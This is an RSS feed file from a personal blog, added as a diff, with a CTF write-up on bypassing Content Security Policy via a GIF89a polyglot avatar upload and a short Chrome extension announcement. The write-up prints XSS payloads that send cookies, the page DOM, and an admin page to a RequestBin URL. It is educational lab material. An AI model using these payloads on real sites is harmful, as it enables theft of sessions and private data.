@@ -1,0 +1,195 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+      <title>devalias.net</title>
+   
+   <link>https://www.devalias.net</link>
+   <description>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.</description>
+   <language>en_GB</language>
+   <managingEditor> </managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+	  <title>CTF Snippets: XSS.gif</title>
+	  <link>/devalias/2016/09/16/ctf-snippets-xss-gif/</link>
+	  <author>devalias</author>
+	  <pubDate>2016-09-16T00:00:00+10:00</pubDate>
+	  <guid>/devalias/2016/09/16/ctf-snippets-xss-gif/</guid>
+	  <description><![CDATA[
+	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I'd do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>
+<h2>Hack the gibso.. Website</h2>
+<p>To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the <code>administrator</code> was online.. interesting.</p>
+<p>Poking around at things, I discovered that the messaging system didn't seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
+<pre lang="html"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+</code></pre>
+<p>I checked the message.. but for some reason it didn't pop, even though my payload seemed fine in the source. :(</p>
+<pre lang="html"><code>&lt;div class=&quot;well&quot;&gt;
+  &lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;/div&gt;
+</code></pre>
+<p>Looking at the developer console gave me some more insight. Apparently this site had <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> enabled, and it was blocking my payload.</p>
+<blockquote>
+<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src 'self'&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M='), or a nonce ('nonce-...') is required to enable inline execution.</p>
+</blockquote>
+<p>Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:</p>
+<pre><code>Content-Security-Policy:
+  default-src 'none';
+  img-src 'self' placehold.it *.imgix.net;
+  script-src 'self';
+  connect-src 'self';
+  style-src 'self' fonts.gstatic.com fonts.googleapis.com;
+  font-src 'self' fonts.googleapis.com fonts.gstatic.com;
+</code></pre>
+<p>Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from <code>self</code>.</p>
+<p>How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.</p>
+<p>Using the <code>GIF89a</code> format (which conveniently starts with it's name, then the rest is the GIF payload) I constructed and uploaded my new 'avatar' <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+window.location='http://requestb.in/secretcode?c='+document.cookie;
+</code></pre>
+<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new 'avatar' by sending myself a test message:</p>
+<pre lang="html"><code>&lt;script src=&quot;http://example.com/uploads/filenamehash.gif&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:</p>
+<blockquote>
+<p>Refused to execute script from '<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>' because its MIME type ('image/gif') is not executable.</p>
+</blockquote>
+<p>This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that <code>HttpOnly</code> flag first.. Sometimes I just get caught up in the heat of the moment.</p>
+<p>Ok.. so we couldn't steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn't seem to get validated. That's good.. but what should we target?</p>
+<p>Needing some better visibility on the situation, I decided to just steal the whole <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+/* Wait for the page to fully load */
+window.onload = function() {
+  /* Create a form to send to RequestBin */
+  var f = document.createElement('form');
+  f.id=&quot;haxForm&quot;;
+  f.method=&quot;post&quot;;
+  f.action=&quot;http://requestb.in/secretcode&quot;;
+
+  /* Create a textarea to store our data */
+  var t = document.createElement('textarea');
+  t.name=&quot;haxPayload&quot;;
+
+  /* Capture the entire DOM and Base64 encode it */
+  t.value = btoa(document.documentElement.outerHTML)
+
+  /* Inject the form and send it */
+  f.appendChild(t);
+  document.body.appendChild(f);
+  document.getElementById(&quot;haxForm&quot;).submit();
+};
+</code></pre>
+<p>Ignoring my rusty JavsScript, the new payload would create a HTML <code>form</code> element with a <code>textarea</code>, grab the entire contents of the DOM, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa">Base64 encode</a> them, stick them in the <code>textarea</code>, inject the <code>form</code> into the page, then send that off to RequestBin.</p>
+<p>After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:</p>
+<pre lang="html"><code>&lt;li&gt;&lt;a href=&quot;admin.php&quot;&gt;Administration&lt;/a&gt;&lt;/li&gt;
+</code></pre>
+<p>Sweet, let's find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+/* Wait for the page to fully load */
+window.onload = function() {
+  /* Create a form to send to RequestBin */
+  var f = document.createElement('form');
+  f.id=&quot;haxForm&quot;;
+  f.method=&quot;post&quot;;
+  f.action=&quot;http://requestb.in/secretcode&quot;;
+
+  /* Create a textarea to store our data */
+  var t = document.createElement('textarea');
+  t.name=&quot;haxPayload&quot;;
+
+  /* Inject the form */
+  f.appendChild(t);
+  document.body.appendChild(f);
+
+  /* Load the admin page ajax-style, Base64 encode it, send it off */
+  $.get(&quot;admin.php&quot;, function(data) {
+    t.value = btoa(data);
+    document.getElementById(&quot;haxForm&quot;).submit();
+  });
+};
+</code></pre>
+<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn't even a need to do anything else:</p>
+<pre lang="html"><code>&lt;legend&gt;
+  &lt;h3&gt;Administration&lt;/h3&gt;
+&lt;/legend&gt;
+&lt;h4&gt;flag{the-secret-flag-code}&lt;/h4&gt;
+</code></pre>
+<p>Mischief managed!</p>
+<h2>Raw Notes</h2>
+<p>I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:</p>
+<ul>
+<li>Administrator is online</li>
+<li>We can send messages to users</li>
+<li>We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self</li>
+<li>We can upload image files (can we make that other types?)
+<ul>
+<li>GIF89a based XSS, won't exec in chrome though..</li>
+</ul>
+</li>
+<li>Administrator will read messages we send them (check the 'sent' page)</li>
+<li>Admin isn't using chrome! :p</li>
+<li>The request doesn't send us any cookies! :( (they're HTTP only)</li>
+<li>CSRF token doesn't seem to actually be validated.. What can we CSRF..?</li>
+<li>Use the XSS to send us the admin's DOM</li>
+<li>Seems there's an admin.php page..</li>
+<li>Ajax the admin page</li>
+<li>Success!</li>
+</ul>
+<h2>Conclusion</h2>
+<p>This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.</p>
+<p>Has this helped you learn something new? Got a better way to approach it? I'd love to hear from you in the comments!</p>
+<h2>References</h2>
+<ul>
+<li>Content Security Policy
+<ul>
+<li><a href="https://www.owasp.org/index.php/Content_Security_Policy">Content Security Policy | OWASP</a></li>
+<li><a href="https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet">Content Security Policy Cheat Sheet | OWASP</a></li>
+<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">&quot;An Introduction to Content Security Policy&quot; by HTML5 Rocks</a></li>
+<li><a href="https://content-security-policy.com/">Content Security Policy References and Examples</a></li>
+</ul>
+</li>
+<li>File Upload/Image XSS
+<ul>
+<li><a href="https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html">&quot;GIF Image XSS&quot; by eXpl0i13r</a></li>
+<li><a href="http://brutelogic.com.br/blog/file-upload-xss/">File Upload XSS | Hack2Learn</a></li>
+<li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of File Signatures | Wikipedia</a></li>
+<li><a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif">&quot;Exploiting PHP-GD imagecreatefromgif() function&quot; by d0lph1n98 </a></li>
+</ul>
+</li>
+<li>Capturing Requests
+<ul>
+<li><a href="https://requestb.in/">Request Bin</a></li>
+</ul>
+</li>
+</ul>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>New Window With Tabs To Right - Chrome Extension</title>
+	  <link>/devalias/2013/08/08/new-window-with-tabs-to-right-chrome-extension/</link>
+	  <author>devalias</author>
+	  <pubDate>2013-08-08T08:00:50+10:00</pubDate>
+	  <guid>/devalias/2013/08/08/new-window-with-tabs-to-right-chrome-extension/</guid>
+	  <description><![CDATA[
+	     <p>(tl;dr I wrote a chrome extension, <a href="https://chrome.google.com/webstore/detail/new-window-with-tabs-to-r/ldahcfljppchbfgdokomobmfdfplaman">get it in the web store</a> or <a href="https://github.com/alias1/chrome-NewWindowWithTabsToRight">check it out on GitHub</a>)</p>
+<p>So I decided I would re-dip my feet into the wonderful world that is chrome extensions. I had a little look a while back, but never really got to making anything relevant.</p>
+<p>This time around I decided to start off simple, and something that I would find useful, so without further ado building up drumroll here is the copypasta of the description I wrote for the chrome web store (there are SO many extra little hoops you have to jump through to go from working code to published in the web store.. Maybe a potential future topic?):</p>
+<blockquote>
+<p>This is a simple little extension (my first proper one!) that I wanted to make my life a little easier.<br />
+It lets you create a new window with the tabs to the right (optionally including the current tab)<br />
+My main reason for wanting this was to more effectively make use of the 'Sesh' extension by Yuji Kosugi when I forgot to open a new window before opening a ton of tabs.<br />
+If you have any comments, criticisms, praise, hatred, marriage proposals, fluffy bunnies, or transdimensional gateway blueprints, feel free to send them through to me at <a href="mailto:feedback@devalias.net">feedback@devalias.net</a> (Make sure to mention the extension name in the subject so I know what you're talking about!)</p>
+</blockquote>
+<p>Since that's a blockquote and I can't link in it, here is a link to <a href="https://chrome.google.com/webstore/detail/sesh/emclpejnhkiogdlimfgipbdfpdcnhhoj">Sesh</a> by <a href="https://about.me/yujily">Yuji Kosugi</a> (highly recommended if you're a tab junkie like myself!)</p>
+<p>So yeah, that's it! Check it out in the <a href="https://chrome.google.com/webstore/detail/new-window-with-tabs-to-r/ldahcfljppchbfgdokomobmfdfplaman">Chrome Web Store</a> and let me know what you think!!</p>
+<p>Oh, by the way, since I love you guys and open source software, it's released under the MIT Licence and you can go and <a href="https://github.com/alias1/chrome-NewWindowWithTabsToRight">check it out over at GitHub</a>! &lt;3</p>
+
+	  ]]></description>
+	</item>
+
+
+</channel>
+</rss>
